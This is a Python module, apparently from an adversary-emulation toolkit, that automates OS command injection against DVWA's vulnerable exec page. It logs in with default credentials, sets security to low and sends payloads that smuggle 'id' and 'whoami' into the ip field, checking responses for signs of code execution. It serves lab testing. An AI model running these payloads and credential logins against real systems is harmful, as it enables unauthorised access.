"""
techniques/initial_access/command_injection.py
ATT&CK: T1190 — Exploit Public-Facing Application
Tactic:  Initial Access

Tests DVWA's command injection module for OS command injection.
Logs in first if no web session cookie exists in Context, then
attempts injection payloads against the configured endpoint.
DVWA Security must be set to Low.
"""

import re
import requests
from typing import Any
from requests.exceptions import RequestException

from core.context import Context
from core.technique import Tactic, Technique

INJECTION_PAYLOADS = [
    "127.0.0.1; id",
    "127.0.0.1 | id",
    "127.0.0.1 && id",
    "; id",
    "| id",
    "127.0.0.1; whoami",
    "127.0.0.1 | whoami",
    "127.0.0.1 && whoami",
]

RCE_INDICATORS = ["uid=", "root", "www-data", "daemon"]


def _extract_user_token(html: str) -> str | None:
    match = re.search(
        r"<input[^>]+name=['\"]user_token['\"][^>]+value=['\"]([a-f0-9]+)['\"]",
        html, re.IGNORECASE
    )
    if not match:
        match = re.search(
            r"<input[^>]+value=['\"]([a-f0-9]+)['\"][^>]+name=['\"]user_token['\"]",
            html, re.IGNORECASE
        )
    return match.group(1) if match else None


def _dvwa_login(session: requests.Session, base_url: str,
                username: str, password: str, timeout: float) -> bool:
    """Log into DVWA and return True if successful."""
    login_url = f"{base_url}/login.php"
    try:
        page = session.get(login_url, timeout=timeout, verify=False)
        token = _extract_user_token(page.text)
        payload = {
            "username": username,
            "password": password,
            "Login": "Login",
        }
        if token:
            payload["user_token"] = token
        resp = session.post(login_url, data=payload,
                            timeout=timeout, allow_redirects=True, verify=False)
        return "logout" in resp.text.lower()
    except RequestException:
        return False


class CommandInjection(Technique):
    name = "command-injection"
    attack_id = "T1190"
    tactic = Tactic.INITIAL_ACCESS

    def __init__(
        self,
        target_url: str,
        vuln_path: str = "/vulnerabilities/exec/",
        param_name: str = "ip",
        method: str = "POST",
        dvwa_username: str = "admin",
        dvwa_password: str = "password",
        timeout: float = 8.0,
    ):
        self.target_url = target_url.rstrip("/")
        self.vuln_path = vuln_path
        self.param_name = param_name
        self.method = method.upper()
        self.dvwa_username = dvwa_username
        self.dvwa_password = dvwa_password
        self.timeout = timeout

    def run(self, context: Context) -> tuple[bool, str, dict[str, Any]]:
        endpoint = f"{self.target_url}{self.vuln_path}"
        session = requests.Session()

        # Use existing web session from Context if HTTPDefaultCreds ran first
        existing_cookies = context.extra.get("web_session_cookies")
        if existing_cookies:
            session.cookies.update(existing_cookies)
        else:
            # Log in ourselves
            success = _dvwa_login(
                session, self.target_url,
                self.dvwa_username, self.dvwa_password, self.timeout
            )
            if not success:
                return False, (
                    f"Could not authenticate to DVWA at {self.target_url} "
                    f"before attempting command injection"
                ), {}

        # Set security level to low via cookie
        session.cookies.set("security", "low")

        successful_payload = None
        rce_output = None

        for payload in INJECTION_PAYLOADS:
            try:
                # Need a fresh user_token for the vuln page too (DVWA Low still checks)
                page = session.get(endpoint, timeout=self.timeout, verify=False)
                token = _extract_user_token(page.text)

                data = {self.param_name: payload, "Submit": "Submit"}
                if token:
                    data["user_token"] = token

                if self.method == "POST":
                    resp = session.post(endpoint, data=data,
                                        timeout=self.timeout, verify=False)
                else:
                    resp = session.get(endpoint, params={self.param_name: payload},
                                       timeout=self.timeout, verify=False)

                body = resp.text
                if any(ind in body for ind in RCE_INDICATORS):
                    successful_payload = payload
                    lines = [
                        line.strip() for line in body.splitlines()
                        if any(ind in line for ind in RCE_INDICATORS)
                    ]
                    rce_output = " | ".join(lines[:5])
                    context.extra["rce_confirmed"] = True
                    context.extra["rce_endpoint"] = endpoint
                    break

            except RequestException:
                continue

        if successful_payload:
            summary = (
                f"Command injection confirmed at {endpoint} — "
                f"payload: {successful_payload!r} — output: {rce_output}"
            )
        else:
            summary = (
                f"No command injection found at {endpoint} "
                f"after {len(INJECTION_PAYLOADS)} payload(s)"
            )

        return bool(successful_payload), summary, {
            "endpoint": endpoint,
            "payloads_tried": len(INJECTION_PAYLOADS),
            "successful_payload": successful_payload,
            "rce_output": rce_output,
        }
